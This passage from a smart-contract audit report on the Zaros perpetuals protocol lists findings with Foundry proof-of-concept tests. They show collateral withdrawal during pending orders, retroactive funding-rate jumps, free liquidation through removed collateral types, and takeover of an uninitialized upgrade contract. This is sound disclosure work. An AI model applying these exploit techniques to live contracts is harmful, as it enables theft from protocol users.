The main issue is that the protocol does not lock the user's collateral when an order is created. The only verification performed is to check if the user has enough collateral to cover their position, as shown below: 

<https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/OrderBranch.sol#L318-L345>

```Solidity
    function createMarketOrder(CreateMarketOrderParams calldata params) external {
      ...
        (
            ctx.marginBalanceUsdX18,
            ctx.requiredInitialMarginUsdX18,
            ctx.requiredMaintenanceMarginUsdX18,
            ctx.orderFeeUsdX18,
            ctx.settlementFeeUsdX18,@
@>        ) = simulateTrade({
            tradingAccountId: params.tradingAccountId,
            marketId: params.marketId,
            settlementConfigurationId: SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
            sizeDelta: params.sizeDelta
        });


        ctx.shouldUseMaintenanceMargin = !Position.isIncreasing(params.tradingAccountId, params.marketId, params.sizeDelta)
            && ctx.isMarketWithActivePosition;


        ctx.requiredMarginUsdX18 =
            ctx.shouldUseMaintenanceMargin ? ctx.requiredMaintenanceMarginUsdX18 : ctx.requiredInitialMarginUsdX18;


        // reverts if the trader can't satisfy the appropriate margin requirement
@>        tradingAccount.validateMarginRequirement(
            ctx.requiredMarginUsdX18, ctx.marginBalanceUsdX18, ctx.orderFeeUsdX18.add(ctx.settlementFeeUsdX18)
        );
    }
```

In a nutshell, this vulnerability will lead to: 

* **Manipulation Opportunity**: Users may reduce their collateral to increase leverage or avoid liquidation, thereby impacting the risk profile and integrity of the system.
* **Undercollateralization**: Withdrawing all collateral makes pending orders undercollateralized, leading to DoS when trying to fill the order. 

## Scenarios

###### Leverage Scenario: 

* A user places a large order in the perpetual futures market with a specific amount of collateral, committing to a defined risk profile.
* The order enters a pending state and is waiting to be filled. 

- **Changing Market Conditions**:

  * Market conditions may shift unfavorably against the user’s position while the order is pending.

- **Manipulation Opportunity**:

  * Without restrictions, the user could reduce their collateral before the order is executed, **increasing leverage with the same exposure but less collateral.**

- **Consequences of Reduced Margin**:

  * **Increased Leverage**: Reducing collateral increases leverage, magnifying potential gains or losses.
  * **Avoiding Liquidation**: Users may avoid liquidation by staying just above the threshold, exposing the protocol to significant risk if the market moves against them post-execution.

- **Systemic Risk**:

  * Allowing changes to collateral during the pending state undermines risk management and fair liquidation processes, potentially leading to greater losses than the protocol can handle.

###### DoS Scenario: 

* A user places a large order in the perpetual futures market with a specific amount of collateral, committing to a defined risk profile.
* The order enters a pending state and is waiting to be filled. 
* User withdraws all collateral before the order is filled
* `Keeper` cannot fill the order as there isn't enough collateral for that position.

## PoC

Add the following test to `checkLiquidatableAccounts.t.sol`and run: `forge test --match-test testWithdrawBeforeFillingOrder_isPossible_leadingToDoS_or_manipulatingLeverage -vv`

```Solidity
// import "forge-std/console.sol";
function testWithdrawBeforeFillingOrder_isPossible_leadingToDoS_or_manipulatingLeverage() public {
        // pre conditions -
        // 1. create an account and deposit margin.
        // 2. create a market order and let it on pending state.
        uint256 marginValueUsdc = 100_00000e6;
        int128 userPositionSizeDelta = 10e18;
        deal({ token: address(usdc), to: users.naruto.account, give: marginValueUsdc });
        changePrank({ msgSender: users.naruto.account });
        uint128 tradingAccountId = createAccountAndDeposit(marginValueUsdc, address(usdc));
        bytes memory mockSignedReport = _creteMarketOrder(
            BTC_USD_MARKET_ID, BTC_USD_STREAM_ID, MOCK_BTC_USD_PRICE, tradingAccountId, userPositionSizeDelta
        );

        // action - withdraw all the collateral
        perpsEngine.withdrawMargin(tradingAccountId, address(usdc), marginValueUsdc);
        console.log("User balance after withdraw: %e", usdc.balanceOf(users.naruto.account));
         
        // post condition: when filling the market order, it should revert due to insufficient margin.
        address marketOrderKeeper = marketOrderKeepers[BTC_USD_MARKET_ID];
        changePrank({ msgSender: marketOrderKeeper });
        perpsEngine.fillMarketOrder(tradingAccountId, BTC_USD_MARKET_ID, mockSignedReport);
    }

    function _creteMarketOrder(
        uint128 marketId,
        bytes32 streamId,
        uint256 mockUsdPrice,
        uint128 tradingAccountId,
        int128 sizeDelta
        ) internal returns (bytes memory mockSignedReport) { 

        perpsEngine.createMarketOrder(
            OrderBranch.CreateMarketOrderParams({
                tradingAccountId: tradingAccountId,
                marketId: marketId,
                sizeDelta: sizeDelta
            })
        ); 

        mockSignedReport = getMockedSignedReport(streamId, mockUsdPrice);
    }
```

Output:&#x20;

* The user can withdraw all his collateral before filling the order.&#x20;
* Keeper triggers DoS(insufficient margin) when trying to fill the order.

```Solidity
@> User balance after withdraw: 1e13 
Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 17.29ms (2.04ms CPU time)

Ran 1 test suite in 130.36ms (17.29ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Encountered 1 failing test in test/integration/perpetuals/liquidation-branch/checkLiquidatableAccounts/checkLiquidatableAccounts.t.sol:CheckLiquidatableAccounts_Integration_Test
@> [FAIL. Reason: InsufficientMargin(1, 0, 10000005000000000000000 [1e22], 802000400000000000000 [8.02e20])] testWithdrawBeforeFillingOrder() (gas: 945692)
```

## Impact

* **Increased Leverage**: User can amplify potential gains or losses by reducing collateral.
* **Avoidance of Liquidation**: User can avoid liquidation and continue to hold high-risk positions.
* **Denial of Service (DoS)**: Undercollateralized orders prevent execution(fill order), disrupting market operations.
* **Systemic Risk**: As filling undercollateralized orders is not possible, it will compromise the protocol's ability to manage risk and enforce fair liquidation, potentially leading to substantial financial losses.

## Tools Used

Manual Review

Foundry

Synthetix previous audit:

<https://iosiro.com/audits/izar-release-smart-contract-audit#5.5.1-restrict-functions-that-could-affect-positions-with-pending-delayed-orders-(medium-risk)>

Synthetix discussion about locking user collateral: <https://github.com/Synthetixio/synthetix-v3/pull/1711>

## Recommendations

Lock the user collateral when he/she has pending orders. This can be done by adding a check on deposit/withdraw margin functions, if the user has pending orders he cannot change his collateral. 

## <a id='L-06'></a>L-06. Updating the maxFundingVelocity should update the funding rate as well

_Submitted by [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [benrai](https://profiles.cyfrin.io/u/benrai), [0xlandlady](https://profiles.cyfrin.io/u/0xlandlady), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro)._      
            


## Summary

[`maxFundingVelocity`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/GlobalConfigurationBranch.sol#L532) of a market can be freely updated by the admins, but the problem is that since funding rate and the elapsed time from last time that the funding was updated are also dependent on it, any update without calling [`PerpMarket::updateFunding`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/PerpMarket.sol#L344-L348) will lead to stepwise jumps in the rates and will either incentivize longs (shorts pay funding fees - funding rate -ve, skew +ve), or shorts (longs pay funding fees - funding rate +ve, skew -ve) because `lastFundingTime` is not set to `block.timestamp`:

```solidity
function updateFunding(Data storage self, SD59x18 fundingRate, SD59x18 fundingFeePerUnit) internal {
    self.lastFundingRate = fundingRate.intoInt256();
    self.lastFundingFeePerUnit = fundingFeePerUnit.intoInt256();
    self.lastFundingTime = block.timestamp;
}
```

## Vulnerability Details

1. Admin updates the `maxFundingVelocity` to any reasonable amount, it’s important to note that admin has nothing to do in this situation.
2. `maxFundingVelocity` is updated without invoking [`PerpMarket::updateFunding`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/PerpMarket.sol#L344-L348).
3. Order is created and in order to get the latest funding rate, `PerpMarket::getCurrentFundingRate` is invoked:

[PerpMarket.sol](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/PerpMarket.sol#L126C5-L148C6)

```solidity
function getCurrentFundingRate(Data storage self) internal view returns (SD59x18) {
    return sd59x18(self.lastFundingRate).add(
        getCurrentFundingVelocity(self).mul(getProportionalElapsedSinceLastFunding(self).intoSD59x18())
    );
}

/// @notice Returns the current funding velocity of the given market.
/// @param self The PerpMarket storage pointer.
function getCurrentFundingVelocity(Data storage self) internal view returns (SD59x18) {
    SD59x18 maxFundingVelocity = sd59x18(uint256(self.configuration.maxFundingVelocity).toInt256());
    SD59x18 skewScale = sd59x18(uint256(self.configuration.skewScale).toInt256());

    SD59x18 skew = sd59x18(self.skew);

    if (skewScale.isZero()) {
        return SD59x18_ZERO;
    }

    SD59x18 proportionalSkew = skew.div(skewScale);
    SD59x18 proportionalSkewBounded = Math.min(Math.max(unary(SD_UNIT), proportionalSkew), SD_UNIT);

    return proportionalSkewBounded.mul(maxFundingVelocity);
}
```

Let’s say the `getProportionalElapsedSinceLastFunding` is 86400 seconds (1 day) and then we see that the `maxFundingVelocity` directly influences the result from `getCurrentFundingVelocity`, and assumes that this velocity is set at the beginning of the previous epoch, while it is recently updated and should be applied from current time.

1. As we saw the velocity is not what should be, which will either incentivize or disincentivize the trader depending on the sign of the new funding rate, but in all matters will not be the expected funding rate for this current period.

> As stated by Zaros team, in the beginning these variables will be more frequently modified due to the early stage of the project and the off-chain calculation that are performed for maximising the profitability for given market. Another scenario which will require more frequent updates of the velocity is for memecoins - highly volatile tokens

Here is a POC, that first opens some positions and warp some time in order for the funding rates to be accumulated, then we update the `maxFundingVelocity` with `uint256.max` to demonstrate that numbers won’t be equal without even touching the system, but in reality it will be smaller amount, and lastly prints both old and new funding rates:

1.

```solidity
import { GlobalConfigurationBranch } from "@zaros/perpetuals/branches/GlobalConfigurationBranch.sol"
```

1.

```solidity
forge test --match-test test_funding_velocity_applied_retroactively -vv
```

```solidity
file: FillMarketOrder_Integration_Test

function test_funding_velocity_applied_retroactively() public {
    Test_GivenTheMarginBalanceUsdIsOverTheMaintenanceMarginUsdRequired_Context memory ctx;

    ctx.marketId = BTC_USD_MARKET_ID;
    ctx.marginValueUsd = 100_000e18;

    deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });

    // Config first fill order

    ctx.fuzzMarketConfig = getFuzzMarketConfig(ctx.marketId);

    ctx.marketOrderKeeper = marketOrderKeepers[ctx.fuzzMarketConfig.marketId];

    ctx.tradingAccountId = createAccountAndDeposit(ctx.marginValueUsd, address(usdz));

    ctx.firstOrderSizeDelta = 10e18;

    (,,, ctx.firstOrderFeeUsdX18,,) = perpsEngine.simulateTrade(
        ctx.tradingAccountId,
        ctx.fuzzMarketConfig.marketId,
        SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
        ctx.firstOrderSizeDelta
    );

    ctx.firstFillPriceX18 = perpsEngine.getMarkPrice(
        ctx.fuzzMarketConfig.marketId, ctx.fuzzMarketConfig.mockUsdPrice, ctx.firstOrderSizeDelta
    );

    perpsEngine.createMarketOrder(
        OrderBranch.CreateMarketOrderParams({
            tradingAccountId: ctx.tradingAccountId,
            marketId: ctx.fuzzMarketConfig.marketId,
            sizeDelta: ctx.firstOrderSizeDelta
        })
    );

    ctx.firstOrderExpectedPnl = int256(0);

    ctx.firstMockSignedReport =
        getMockedSignedReport(ctx.fuzzMarketConfig.streamId, ctx.fuzzMarketConfig.mockUsdPrice);

    changePrank({ msgSender: ctx.marketOrderKeeper });

    // it should transfer the pnl and fees
    expectCallToTransfer(usdz, feeRecipients.settlementFeeRecipient, DEFAULT_SETTLEMENT_FEE);
    expectCallToTransfer(usdz, feeRecipients.orderFeeRecipient, ctx.firstOrderFeeUsdX18.intoUint256());

    perpsEngine.fillMarketOrder(ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.firstMockSignedReport);

    changePrank({ msgSender: users.naruto.account });

    // if changed this to "/10" instead of "/11" naruto would be liquidatable,
    // so this is just on the verge of being liquidated
    uint256 updatedPrice = MOCK_BTC_USD_PRICE - MOCK_BTC_USD_PRICE / 11;
    updateMockPriceFeed(BTC_USD_MARKET_ID, updatedPrice);

    // reduce the position with negative size delta
    ctx.secondOrderSizeDelta = -(ctx.firstOrderSizeDelta - ctx.firstOrderSizeDelta / 2);
    ctx.fuzzMarketConfig.mockUsdPrice = updatedPrice;

    ctx.secondFillPriceX18 = perpsEngine.getMarkPrice(
        ctx.fuzzMarketConfig.marketId, ctx.fuzzMarketConfig.mockUsdPrice, ctx.secondOrderSizeDelta
    );

    (,,, ctx.secondOrderFeeUsdX18,,) = perpsEngine.simulateTrade(
        ctx.tradingAccountId,
        ctx.fuzzMarketConfig.marketId,
        SettlementConfiguration.MARKET_ORDER_CONFIGURATION_ID,
        ctx.secondOrderSizeDelta
    );
    //------------------------------After order simulations--------------------------
    vm.warp(block.timestamp + 86_400);
    //TODO pre-update
    SD59x18 oldFundingRate = perpsEngine.getFundingRate(ctx.fuzzMarketConfig.marketId);

    //TODO previous market config
    (
        string memory name,
        string memory symbol,
        uint128 initialMarginRateX18,
        uint128 maintenanceMarginRateX18,
        uint128 maxOpenInterest,
        uint128 maxSkew,
        uint128 minTradeSizeX18,
        uint256 skewScale,
    ) = perpsEngine.getPerpMarketConfiguration(BTC_USD_MARKET_ID);

    //TODO update max funding velocity (other params are mocked values, just reuse the old ones)

    changePrank({ msgSender: users.owner.account });
    GlobalConfigurationBranch.UpdatePerpMarketConfigurationParams memory params;
    params.name = name;
    params.symbol = symbol;
    params.priceAdapter = address(1);
    params.maintenanceMarginRateX18 = maintenanceMarginRateX18;
    params.maxOpenInterest = maxOpenInterest;
    params.maxSkew = maxSkew;
    params.initialMarginRateX18 = initialMarginRateX18;
    params.skewScale = skewScale;
    params.minTradeSizeX18 = minTradeSizeX18;
    params.priceFeedHeartbeatSeconds = 1;

    //TODO here we change the MFV to really big number to see the difference:
    params.maxFundingVelocity = type(uint128).max;

    perpsEngine.updatePerpMarketConfiguration(BTC_USD_MARKET_ID, params);
    SD59x18 updatedFundingRate = perpsEngine.getFundingRate(ctx.fuzzMarketConfig.marketId);

    console.log("old:", oldFundingRate.intoUint256());
    console.log("current:", updatedFundingRate.intoUint256());
    assertNotEq(oldFundingRate.intoUint256(), updatedFundingRate.intoUint256());
}
```

## Impact

Stepwise jumps in the funding rates when `maxFundingVelocity` is update, since `updateFunding` is not called and system wrongly assumes that velocity is changed at time `T = lastFundingTime`, while it should be from the time that `updatePerpMarketConfiguration` is called.

## Tools Used

Manual Review

## Recommendations

add `updateFunding` in `GlobalConfigurationBranch::updatePerpMarketConfiguration` when `maxFundingVelocity` is being modified.

## <a id='L-07'></a>L-07. Deleting CollateralTypes from the CollateralLiquidationPriority allows traders to be liquidated for free and getting back their full collateral as if they were not liquidated.

_Submitted by [lordofterra](https://profiles.cyfrin.io/u/lordofterra), [petersr](https://profiles.cyfrin.io/u/petersr), [benrai](https://profiles.cyfrin.io/u/benrai), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [gajiknownnothing](https://profiles.cyfrin.io/u/gajiknownnothing), [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [TeamRockSolid](https://codehawks.cyfrin.io/team/clygyrphg000bl0xpkpo7qch4), [infect3d](https://profiles.cyfrin.io/u/infect3d), [0x1982us](https://profiles.cyfrin.io/u/0x1982us), [inzinko](https://profiles.cyfrin.io/u/inzinko), [kildren](https://profiles.cyfrin.io/u/kildren), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro). Selected submission by: [0xstalin](https://profiles.cyfrin.io/u/0xstalin)._      
            


````markdown
## Summary
Removing a CollateralType from the CollateralLiquidationPriority causes that accounts can be liquidated for free without being charged for their losses, and, traders are able to get back a 100% of their collateral after a liquidation.


## Vulnerability Details
[When deducting margin from an account to cover a liquidation](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L488-L578), the order of liquidation is determined by the `collateralLiquidationPriority`, it will iterate over all the collaterals in this list and will try to deduct the exact amount to be deducted, or at least, the most that can be deducted (in case the user's collateral is less than what it should be deducted).

[When collateral is removed from the `collateralLiquidationPriority`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/GlobalConfigurationBranch.sol#L271-L280), [users are not allowed to continue depositing that asset as collateral for their accounts.](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/TradingAccountBranch.sol#L342-L343) But, a secondary effect of removing a collateral from the `collateralLiquidationPriority` is that tis collateral won't be able to be deducted when deducting margin from an account.

While the collateralType was part of the `collateralLiquidationPriority`, users could have deposited that collateral in their accounts, and, they could have opened positions.

**The problem with the existing logic to deduct margin is that once collateral is removed from the `collateralLiquidationPriority`, even though an account has only that collateral as its collateralBalance, the deduct margin logic won't deduct such a collateral from the user**, and, because liquidations try to remove as most collateral as it could without reverting, this allows for free liquidations where the user's bad investements would be removed for free without paying for it, and, after the account has been liquidated, the account's owner will be able to withdraw all the collateral from its account.

### Coded PoC
On this PoC, we simulate a scenario where a specific collateral is part of the `collateralLiquidationPriority`, and, an accout deposits some of it to open a position. After some time, this collateral is removed from the `collateralLiquidationPriority`, and, the user's account gets liquidable. After liquidating the account, the account's owner proceeds to withdraw a 100% of its collateral, as if the account would have never been liquidated.

Add the below PoC in the [`liquidateAccounts.t.sol`](https://github.com/Cyfrin/2024-07-zaros/blob/main/test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol) test file.

Run the PoC with the next command: `forge test --match-test test_FreeLiquidationWhenCollateralIsRemovedFromCollateralLiquidationPriorityPoC -vvvv`

<details>
<summary><b>Expand to see PoC</b></summary>
<br>

```
function test_FreeLiquidationWhenCollateralIsRemovedFromCollateralLiquidationPriorityPoC()
    external
    givenTheSenderIsARegisteredLiquidator
    whenTheAccountsIdsArrayIsNotEmpty
    givenAllAccountsExist
{
    uint256 marketId = 3;
    uint256 secondMarketId = 5;
    bool isLong = true;
    uint256 timeDelta = 1 weeks;

    TestFuzz_GivenThereAreLiquidatableAccountsInTheArray_Context memory ctx;

    ctx.fuzzMarketConfig = getFuzzMarketConfig(marketId);
    ctx.secondMarketConfig = getFuzzMarketConfig(secondMarketId);

    vm.assume(ctx.fuzzMarketConfig.marketId != ctx.secondMarketConfig.marketId);

    uint256 amountOfTradingAccounts = 1;

    ctx.marginValueUsd = 10_000e18 / amountOfTradingAccounts;
    ctx.initialMarginRate = ctx.fuzzMarketConfig.imr;

    deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });

    // last account id == 0
    ctx.accountsIds = new uint128[](amountOfTradingAccounts);

    ctx.accountMarginValueUsd = ctx.marginValueUsd / (amountOfTradingAccounts);

    {
        ctx.tradingAccountId = createAccountAndDeposit(ctx.accountMarginValueUsd, address(usdz));

        openPosition(
            ctx.fuzzMarketConfig,
            ctx.tradingAccountId,
            ctx.initialMarginRate,
            ctx.accountMarginValueUsd / 2,
            isLong
        );

        openPosition(
            ctx.secondMarketConfig,
            ctx.tradingAccountId,
            ctx.secondMarketConfig.imr,
            ctx.accountMarginValueUsd / 2,
            isLong
        );

        ctx.accountsIds[0] = ctx.tradingAccountId;

        deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });
    }

    //@audit => Removing usdz from the LiquidationPriority.
    changePrank({ msgSender: users.owner.account });
    perpsEngine.removeCollateralFromLiquidationPriority(address(usdz));

    setAccountsAsLiquidatable(ctx.fuzzMarketConfig, isLong);
    setAccountsAsLiquidatable(ctx.secondMarketConfig, isLong);

    uint256 usdzCollateralOwnedByLiquidatedAccount_BeforeLiquidation = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId,address(usdz)).intoUint256();

    //@audit => Underwater user is liquidated
    //@audit-issue => Because the user's collateral was removed from the liquidationPriority, the liquidation will be made for free
    //@audit-issue => The negative PnL of the user will be erased for free without taking any of his collateral.
    changePrank({ msgSender: liquidationKeeper });
    skip(timeDelta);
    perpsEngine.liquidateAccounts(ctx.accountsIds);

    // console2.log("usdz collateral in perp engine after liquidation: ", usdz.balanceOf(address(perpsEngine)));

    uint256 usdzCollateralOwnedByLiquidatedAccount_AfterLiquidation = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId,address(usdz)).intoUint256();
    
    //@audit => None of the liquidated user's collateral was seized during the liquidation
    assertEq(usdzCollateralOwnedByLiquidatedAccount_BeforeLiquidation, usdzCollateralOwnedByLiquidatedAccount_AfterLiquidation);

    uint256 usdzLiquidatedUserBalance_BeforeWithdrawing = usdz.balanceOf(address(users.naruto.account));

    //@audit => User is now able to withdraw all the deposited collateral. His losses were liquidated for free and now it can get back all the original deposited collateral regardless of the loss on his trading!
    changePrank({ msgSender: users.naruto.account });
    perpsEngine.withdrawMargin(ctx.tradingAccountId,address(usdz),usdzCollateralOwnedByLiquidatedAccount_AfterLiquidation);

    uint256 usdzLiquidatedUserBalance_AfterWithdrawing = usdz.balanceOf(address(users.naruto.account));

    assert(usdzLiquidatedUserBalance_AfterWithdrawing > usdzLiquidatedUserBalance_BeforeWithdrawing);

}

```

</details>
</br>


## Impact
Traders are able to be liquidated without getting their collateral deducted from their accounts.

## Tools Used
Manual Audit & Foundry

## Recommendations
In order to preserve the logic of deducting margin based on a priority list, so that collaterals with the best loanToValue are deducted until the last, I'd recommend to add the below logic after the iteration over the collateralLiquidationPriority is over, the idea is to handle the scenario when a collatearl was removed from the collateralLiquidationPriority, but, the account could have that collateral as part of its marginCollateralBalance.

[`TradingAccount.deductAccountMaring() function`](https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L488-L578)
```
    function deductAccountMargin(
        Data storage self,
        FeeRecipients.Data memory feeRecipients,
        UD60x18 pnlUsdX18,
        UD60x18 settlementFeeUsdX18,
        UD60x18 orderFeeUsdX18
    )
        internal
        returns (UD60x18 marginDeductedUsdX18)
    {
        // working data
        DeductAccountMarginContext memory ctx;

        ...

        // loop through configured collateral types
        for (uint256 i; i < cachedCollateralLiquidationPriorityLength; i++) {
            ...
        }

        // output total margin deducted
        marginDeductedUsdX18 =
            ctx.settlementFeeDeductedUsdX18.add(ctx.orderFeeDeductedUsdX18).add(ctx.pnlDeductedUsdX18);

        //@audit => Recommendation to mitigate this bug

        //@audit => If isMissingMargin remained in the default value and marginDeductedUsdX18 is 0, that means that the account had no collateral from the collateralLiquidationPriority 
        if (ctx.isMissingMargin == false && marginDeductedUsdX18.eq(0)) {
          UD60x18 totalToDeductX18 = pnlUsdX18.add(settlementFeeUsdX18).add(orderFeeUsdX18);

          //@audit => Iterate over the exact list of collateral of the account been liquidated!
          uint256 cachedMarginCollateralBalanceLength = self.marginCollateralBalanceX18.length();
          for (uint256 i; i < cachedMarginCollateralBalanceLength; i++) {
              (address collateralType, uint256 balanceX18) = self.marginCollateralBalanceX18.at(i);

              //@audit => Deduct from this collateral what it needs/can be deducted!

              //@audit => Make sure to recompute `marginDeductedUsdX18` to add the amount of collateral deducted from the collateral that was not part of the collateralLiquidationPriority.

          }

        }

    }
```
````

## <a id='L-08'></a>L-08. payable Modifier in TradingAccountBranch::createTradingAccountAndMulticall 

_Submitted by [sancybars](https://profiles.cyfrin.io/u/sancybars), [0xlrivo](https://profiles.cyfrin.io/u/0xlrivo), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [heim](https://profiles.cyfrin.io/u/heim), [pelz](https://profiles.cyfrin.io/u/pelz), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [josh4324](https://profiles.cyfrin.io/u/josh4324), [cybrid](https://profiles.cyfrin.io/u/cybrid), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [0xabhayy](https://profiles.cyfrin.io/u/0xabhayy), [frontrunner](https://profiles.cyfrin.io/u/frontrunner), [HawkEyes](https://codehawks.cyfrin.io/team/clz6n1eno000b5gq7lra17g1r), [0xdhanraj30](https://profiles.cyfrin.io/u/0xdhanraj30), [emma77](https://profiles.cyfrin.io/u/emma77), [cryptedoji](https://profiles.cyfrin.io/u/cryptedoji), [AghaDanial](https://profiles.cyfrin.io/u/AghaDanial), [0xd4n13l](https://profiles.cyfrin.io/u/0xd4n13l), [greed](https://profiles.cyfrin.io/u/greed), [smartoshield](https://profiles.cyfrin.io/u/smartoshield). Selected submission by: [frontrunner](https://profiles.cyfrin.io/u/frontrunner)._      
            


## Summary

The `createTradingAccountAndMulticall` function is marked as `payable`, which means it can receive Ether (ETH) when called. However, the function's code does not utilize `msg.value`, the parameter that represents the amount of ETH sent with the call. 

## Vulnerability Details

```diff
function createTradingAccountAndMulticall(
        bytes[] calldata data,
        bytes memory referralCode,
        bool isCustomReferralCode
    )
        external
-        payable // Marked as payable but no msg.valu utilization
        virtual
        returns (bytes[] memory results)
    {
        uint128 tradingAccountId = createTradingAccount(referralCode, isCustomReferralCode);

        results = new bytes[](data.length);
        for (uint256 i; i < data.length; i++) {
            bytes memory dataWithAccountId = bytes.concat(data[i][0:4], abi.encode(tradingAccountId), data[i][4:]);
            (bool success, bytes memory result) = address(this).delegatecall(dataWithAccountId);

            if (!success) {
                uint256 len = result.length;
                assembly {
                    revert(add(result, 0x20), len)
                }
            }

            results[i] = result;
        }
    }

```





## Impact

The `payable` modifier suggests that the function expects ETH to be sent with the call. This can be misleading to users and developers who might assume that sending ETH has some effect within the function.

Since the function is marked as `payable` but does not use `msg.value`, any ETH sent to this function call will not be utilized within the function.

## Tools Used

## Recommendations

If the function is not designed to handle ETH, removing the `payable` modifier will prevent ETH from being sent and eliminate potential confusion.


## <a id='L-09'></a>L-09. UpgradeBranch.sol does not use _disableInitializers()

_Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [pelz](https://profiles.cyfrin.io/u/pelz), [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf), [brene](https://profiles.cyfrin.io/u/brene), [0xstalin](https://profiles.cyfrin.io/u/0xstalin). Selected submission by: [AuditTemple](https://codehawks.cyfrin.io/team/clyo65dx70009vjk4le7hszsf)._      
            


## Summary

&#x20;

`UpgradeBranch.sol` does not disable initializers which allows a third party to become the owner of this implementation contract.

## Vulnerability Details

`UpgradeBranch.sol` is one of the implementation contracts that the `rootProxy` will point to once the `rootProxy` gets deployed.  Since `UpgradeBranch.sol` does not disable initializers in its constructor, this opens the possibility for a third party to make himself the owner of `UpgradeBranch.sol` by calling `initialize()`.

```Solidity
contract UpgradeBranch is Initializable, OwnableUpgradeable {
    using RootUpgrade for RootUpgrade.Data;

@>  function initialize(address owner) external initializer {
        __Ownable_init(owner);
    }
}

```

The problem here is that the `UpgradeBranch` itself contains the [upgrade logic function](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/tree-proxy/branches/UpgradeBranch.sol#L19):

```Solidity
 function upgrade(
        RootProxy.BranchUpgrade[] memory branchUpgrades,
        address[] memory initializables,
        bytes[] memory initializePayloads
    )
        external
    {
        _authorizeUpgrade(branchUpgrades);
        RootUpgrade.Data storage rootUpgrade = RootUpgrade.load();

        rootUpgrade.upgrade(branchUpgrades, initializables, initializePayloads);
    }
```

It executes a delegatecall to any address, which means that the account that takes over the implementation can provide a malicious contract with `selfdestruct()`and destroy the implementation. The problem here is that the implementation contract itself is used to execute the upgrade logic( UUPS) instead the logic living on the Proxy (Transperent Upgradeable Proxy).

Sad simply, In order for the proxy to upgrade to another contract it relies on the implementation of `UpgradeBranch`, but if the implementation gets destroyed, there would be no way (no logic) to update to another contract or simply replace it ( as would be possible if the upgrade logic lives in the proxy itself)

## Impact

Implementation can get destoyed, compromising future updates

## Tools Used

Manual Review

## Recommended Mitigation

Make the following changes to `UpgradeBranch.sol` :

```Solidity
contract UpgradeBranch is Initializable, OwnableUpgradeable {
    using RootUpgrade for RootUpgrade.Data;
    
+   constructor() {
+		    _disableInitializers();
+		}

    function initialize(address owner) external initializer {
        __Ownable_init(owner);
    }

    function upgrade(
        RootProxy.BranchUpgrade[] memory branchUpgrades,
        address[] memory initializables,
        bytes[] memory initializePayloads
    )
        external
    {
        _authorizeUpgrade(branchUpgrades);
        RootUpgrade.Data storage rootUpgrade = RootUpgrade.load();

        rootUpgrade.upgrade(branchUpgrades, initializables, initializePayloads);
    }

    function _authorizeUpgrade(RootProxy.BranchUpgrade[] memory) internal onlyOwner { }
}

```

## <a id='L-10'></a>L-10. Trading accounts can exceed the maximum number of allowed open positions.

_Submitted by [T1MOH](https://profiles.cyfrin.io/u/T1MOH), [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [bigsam](https://profiles.cyfrin.io/u/bigsam), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [AllTooWell](https://codehawks.cyfrin.io/team/clvmefpm30001oev62qxtl4zt), [blutorque](https://profiles.cyfrin.io/u/blutorque), [tricko](https://profiles.cyfrin.io/u/tricko), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [draiakoo](https://profiles.cyfrin.io/u/draiakoo), [TeamRockSolid](https://codehawks.cyfrin.io/team/clygyrphg000bl0xpkpo7qch4), [bladesec](https://profiles.cyfrin.io/u/bladesec), [Oblivionis](https://profiles.cyfrin.io/u/Oblivionis), [0x1982us](https://profiles.cyfrin.io/u/0x1982us). Selected submission by: [tricko](https://profiles.cyfrin.io/u/tricko)._      
            


## Summary
Each trading account has a maximum limit on the number of open positions. For market orders, this limit is checked only during order creation (`OrderBranch.createMarketOrder()`), not during order settlement. As a result, it is possible to exceed the maximum number of open positions if multiple offchain orders are filled.

## Vulnerability Details
